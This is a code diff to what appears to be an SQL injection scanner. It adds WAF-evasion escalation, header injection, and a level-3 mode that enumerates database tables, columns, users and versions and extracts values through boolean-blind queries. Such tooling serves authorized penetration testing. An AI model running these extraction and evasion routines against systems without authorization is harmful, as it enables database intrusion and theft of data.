@@ -13,7 +13,7 @@ import time
 from typing import Any, Dict, List, Optional, Tuple
 
 from ..log import get_logger
-from ..reporter import ErrorBasedFinding, BooleanFinding, UnionFinding, ScanResult
+from ..reporter import ErrorBasedFinding, BooleanFinding, UnionFinding, ExtractionFinding, ScanResult
 from ..http.injector import Injector, parse_post_data
 from ..http.waf_detect import EVASION_NONE
 from .options import ScanOptions
@@ -67,19 +67,54 @@ def scan_param(
     if baseline is None:
         return
 
-    evasion = evasions[0] if evasions else EVASION_NONE
+    _prev_error_count   = len(result.error_based)
+    _prev_boolean_count = len(result.boolean_based)
+    _prev_union_count   = len(result.union_based)
 
-    if opts.use_error:
-        _test_error_based(url, method, params, param, evasion, opts, injector, result,
+    for evasion in (evasions if evasions else [EVASION_NONE]):
+        if opts.use_error and len(result.error_based) == _prev_error_count:
+            _test_error_based(url, method, params, param, evasion, opts, injector, result,
+                              second_url, json_body, path_index)
+
+        if opts.use_boolean and len(result.boolean_based) == _prev_boolean_count:
+            _test_boolean(url, method, params, param, baseline, evasion, opts, injector, result,
                           second_url, json_body, path_index)
 
-    if opts.use_boolean:
-        _test_boolean(url, method, params, param, baseline, evasion, opts, injector, result,
-                      second_url, json_body, path_index)
+        if opts.use_union and opts.level >= 2 and len(result.union_based) == _prev_union_count:
+            _test_union(url, method, params, param, evasion, opts, injector, result,
+                        second_url, json_body, path_index)
 
-    if opts.use_union and opts.level >= 2:
-        _test_union(url, method, params, param, evasion, opts, injector, result,
-                    second_url, json_body, path_index)
+        # Stop escalating if all enabled techniques found something
+        _error_done   = (not opts.use_error)  or len(result.error_based)   > _prev_error_count
+        _boolean_done = (not opts.use_boolean) or len(result.boolean_based) > _prev_boolean_count
+        _union_done   = (not opts.use_union or opts.level < 2) or len(result.union_based) > _prev_union_count
+        if _error_done and _boolean_done and _union_done:
+            break
+
+    # Level 3: run extended payload sets (db_contents + enum) via error channel
+    if opts.level >= 3 and opts.use_error:
+        evasion = evasions[0] if evasions else EVASION_NONE
+        from .payloads import get_db_contents_payloads, get_enum_payloads
+        _dbms = result.dbms_detected or opts.dbms
+        _extended = (
+            get_db_contents_payloads(_dbms, "tables")
+            + get_db_contents_payloads(_dbms, "columns")
+            + get_enum_payloads("version")
+            + get_enum_payloads("current_user")
+            + get_enum_payloads("current_database")
+        )
+        for raw_payload in _extended:
+            payload = apply_evasion(raw_payload, evasion)
+            resp = _fetch(injector, url, method, params, param, payload,
+                          second_url=second_url, json_body=json_body, path_index=path_index)
+            if resp is None:
+                continue
+            dbms_hit, evidence = _detect_db_error(resp)
+            if dbms_hit:
+                result.append_error_based(ErrorBasedFinding(
+                    url=url, parameter=param, method=method,
+                    payload=payload, dbms=dbms_hit, evidence=evidence,
+                ))
 
 
 # ---------------------------------------------------------------------------
@@ -187,6 +222,28 @@ def _test_boolean(
                 confirmed=confirmed,
                 evidence=resp_true[:200],
             ))
+            # Level 3: attempt data extraction via binary-search char extractor
+            if opts.level >= 3 and confirmed:
+                from .extract import extract_value
+                _dbms = getattr(opts, "dbms", "auto")
+                _expr = "VERSION()" if _dbms not in ("sqlite", "oracle") else "sqlite_version()" if _dbms == "sqlite" else "(SELECT banner FROM v$version WHERE rownum=1)"
+                _extracted = extract_value(
+                    expr=_expr,
+                    surface={"url": url, "method": method, "params": params,
+                             "single_param": param,
+                             "json_body": json_body, "path_index": path_index},
+                    evasions=[evasion],
+                    opts=opts,
+                    injector=injector,
+                    baseline=baseline,
+                    mode="boolean",
+                )
+                if _extracted:
+                    logger.finding("Extracted via boolean blind: %s param=%s value=%s", url, param, _extracted)
+                    result.append_extraction(ExtractionFinding(
+                        url=url, parameter=param, method=method,
+                        expr=_expr, value=_extracted, mode="boolean",
+                    ))
             return  # one finding per param
 
 
@@ -429,6 +486,8 @@ def _fetch(
                 injector.inject_path(url, path_index, injected[param])
             elif method.upper() == "COOKIE":
                 injector.inject_cookie(url, param, injected[param])
+            elif method.upper() == "HEADER":
+                injector.inject_header(url, param, injected[param])
             else:
                 injector.inject_get(url, param, injected[param])
             resp = injector.get(second_url)
@@ -441,6 +500,8 @@ def _fetch(
             resp = injector.inject_path(url, path_index, injected[param])
         elif method.upper() == "COOKIE":
             resp = injector.inject_cookie(url, param, injected[param])
+        elif method.upper() == "HEADER":
+            resp = injector.inject_header(url, param, injected[param])
         else:
             # For GET, rebuild the URL with the injected param value
             resp = injector.inject_get(url, param, injected[param])
